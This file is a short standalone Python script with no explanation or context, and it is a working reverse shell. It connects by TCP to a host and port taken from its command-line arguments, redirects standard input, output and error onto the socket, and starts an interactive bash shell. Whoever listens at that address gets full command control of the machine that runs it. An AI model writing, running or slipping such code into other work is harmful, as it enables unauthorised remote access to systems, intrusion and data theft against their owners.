import os
import sys
import socket
import subprocess
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
host = sys.argv[1]
port = int(sys.argv[2])
s.connect((host,port));
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
P=subprocess.call(["/bin/bash","-i"])